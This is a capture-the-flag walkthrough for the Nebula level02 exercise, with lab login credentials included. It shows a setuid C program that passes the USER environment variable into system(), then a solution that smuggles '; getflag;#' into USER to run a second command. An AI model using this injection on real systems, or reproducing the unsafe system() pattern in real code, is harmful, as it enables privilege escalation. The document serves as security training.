# Level02

There is a vulnerability in the below program that allows arbitrary programs to
be executed, can you find it?

To do this level, log in as the **level02** account with the password
**level02**. Files for this level can be found in /home/flag02.

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
char *buffer;

gid_t gid;
uid_t uid;

gid = getegid();
uid = geteuid();

setresgid(gid, gid, gid);
setresuid(uid, uid, uid);

buffer = NULL;

asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
printf("about to call system(\"%s\")\n", buffer);

system(buffer);
}
```

## Solution

Once again a setuid program, in this case the command string being passed to the system function call is constructed using the `USER` env var, which we control, so we can craft the USER env var value to allow us to execute the getflag binary:

```terminal
level02@nebula:/home/flag02$ env USER='; getflag;#' ./flag02
about to call system("/bin/echo ; getflag;# is cool")

You have successfully executed getflag on a target account

```

So we first terminate the echo command with a semicolon, then run our target getflag command and then comment out the "is cool" part using the `#` character for a cleaner output
